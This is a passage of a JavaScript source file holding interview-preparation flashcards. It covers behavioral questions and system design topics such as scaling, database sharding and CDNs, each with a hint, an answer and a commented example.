          answer: "State a genuine, professional weakness (not 'I work too hard'). Crucially, follow it up immediately with the actionable steps you are taking to improve it.",
          code: "// Example Weakness + Growth:\n// 'In the past, I struggled with delegating tasks because I wanted to ensure quality.'\n// 'However, I realized this creates bottlenecks.'\n// 'Now, I use a framework to break down tasks clearly and do code reviews instead of writing it all myself.'",
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-5",
          q: "Behavioral: 'Tell me about a project you are proud of.'",
          hint: "STAR method, emphasize YOUR contribution.",
          answer: "Use the STAR method. Clearly explain the technical challenges, the specific actions YOU took (avoid using 'we' too much), and the measurable results/impact of the project.",
          code: "// S: 'App load time was 5 seconds.'\n// T: 'Needed to optimize for better user retention.'\n// A: 'I implemented code splitting, lazy loading, and optimized images.'\n// R: 'Load time dropped to 1.2s, and bounce rate decreased by 20%.'",
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-6",
          q: "Questions for the interviewer: What should you ask?",
          hint: "Ask about team, culture, tech challenges.",
          answer: "Always ask questions! Ask about day-to-day responsibilities, the team's biggest technical challenge right now, engineering culture (code reviews, testing), or opportunities for growth.",
          code: "// Good questions to ask:\n// - 'What does a typical day look like for an engineer in this role?'\n// - 'What is the most challenging technical problem the team is facing right now?'\n// - 'How does the team handle code reviews and testing?'\n// - 'How do you measure success in this role?'",
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-7",
          q: "System Design: How to approach a system design question?",
          hint: "Requirements -> Capacity -> High-level -> Deep dive.",
          answer: "1. Clarify Requirements (Functional & Non-Functional). 2. Back-of-envelope Estimation (Capacity). 3. High-level Design (Draw components). 4. Deep Dive (Database schema, APIs, scaling bottlenecks).",
          code: "// 1. Clarify: 'Is this read-heavy or write-heavy? How many users?'\n// 2. Estimate: '10M DAU * 10 req/day = 1000 QPS.'\n// 3. High-level: Client -> Load Balancer -> App Servers -> Database (Master/Slave)\n// 4. Deep Dive: 'To handle the read load, I'd add a Redis cache layer here...'",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p21-8",
          q: "What is Horizontal vs Vertical Scaling?",
          hint: "More machines vs bigger machine.",
          answer: "Vertical scaling (Scaling Up) means adding more power (CPU, RAM) to an existing server. Horizontal scaling (Scaling Out) means adding more servers to a pool and using a load balancer.",
          code: "// Vertical Scaling:\n// Upgrade EC2 instance from 2GB RAM to 16GB RAM. (Has a hard limit)\n\n// Horizontal Scaling:\n// Go from 1 server to 10 servers behind a Load Balancer. (Infinite scale, more complex)",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p21-9",
          q: "What is Database Sharding?",
          hint: "Splitting rows across multiple servers.",
          answer: "A type of database partitioning that separates very large databases into smaller, faster, more easily managed parts called data shards, which are distributed across multiple servers.",
          code: "// Example of Sharding Strategy:\n// Hashing the User ID to determine which database server holds their data.\n// Server A: Users with IDs ending in 0-4\n// Server B: Users with IDs ending in 5-9\n// Pros: Massive scale. Cons: Complex joins across shards.",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p21-10",
          q: "What is a Content Delivery Network (CDN)?",
          hint: "Geographically distributed edge servers.",
          answer: "A geographically distributed network of proxy servers and their data centers. The goal is to provide high availability and performance by distributing static assets (images, JS, CSS) spatially relative to end-users.",
          code: "// Without CDN:\n// User in Australia requests image from Server in New York (200ms latency)\n\n// With CDN:\n// Image is cached in a CDN edge server in Sydney.\n// User in Australia requests image -> Served from Sydney (20ms latency)",
          category: "System Design",
          language: "javascript"
        }
      ];
    default:
      return [];
  }
}
